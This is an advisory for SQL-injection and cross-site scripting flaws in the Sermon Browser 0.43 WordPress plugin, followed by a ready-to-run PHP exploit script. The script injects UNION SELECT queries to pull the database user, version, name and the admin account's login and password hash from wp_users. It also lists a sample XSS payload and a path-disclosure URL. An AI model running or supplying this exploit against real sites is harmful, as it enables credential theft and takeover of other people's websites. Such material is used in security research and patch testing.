source: http://www.securityfocus.com/bid/47574/info

The Sermon Browser plugin for WordPress is prone to a cross-site scripting vulnerability and an SQL-injection vulnerability because the application fails to sufficiently sanitize user-supplied input.

Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.

Sermon Browser 0.43 is vulnerable; other versions may also be affected. 

<?php
 
if(!$argv[1])
die("
 
Usage   : php exploit.php [site]
Example : php exploit.php http://site.com/wp/
 
");
print_r("
 
# Tilte......: [ WordPress SermonBrowser Plugin 0.43 SQL Injection ]
# Author.....: [ Ma3sTr0-Dz ]
# Date.......: [ 25-o4-2o11 ]
# Location ..: [ ALGERIA ]
# HoMe ......: [ wWw.sEc4EvEr.CoM ]
# Download ..: [ http://www.4-14.org.uk/wordpress-plugins/sermon-browser ]
# Gr33tz ....: [ All Sec4ever Member'z ]
# Real Bug Founder : Lagripe-Dz
 
                      -==[ ExPloiT ]==-
                       
# SQL Inj : http://site/wp/?sermon_id=-1+union+select+version(),2--
# XSS     : http://site/wp/?download&file_name=<script>alert(0)</script>
# FPD     : http://site/wp/wp-content/plugins/sermon-browser/sermon.php
 
                       -==[ Start ]==-
 
");
 
$t=array("db_usr"=>"user()","db_ver"=>"version()","db_nam"=>"database()","usr_nm"=>"user_login","passwd"=>"user_pass");
 
function text2hex($string) {
 $hex = '';
 $len = strlen($string) ;
 for ($i = 0; $i < $len; $i++) {
  $hex .= str_pad(dechex(ord($string[$i])), 2, 0, STR_PAD_LEFT);
 }
 return $hex;
}
 
foreach($t as $r=>$y){
 
$x=@file_get_contents($argv[1]."?sermon_id=-1/**/UnIoN/**/SeLeCt/**/group_concat(0x".text2hex("<$r>").",$y,0x".text2hex("<$r>")."),2+from+wp_users+where+ID=1--");
 
preg_match_all("{<$r>(.*?)<$r>}i",$x, $dz);
 
echo $u = ($dz[1][0]) ? "[-] $r  : ".$dz[1][0]."\n" : "[-] $r  : Failed !\n";
 
}
 
print_r("
                      -==[ Finished ]==-
");
 
# By Lagripe-Dz .. !
# END .. !
 
?>
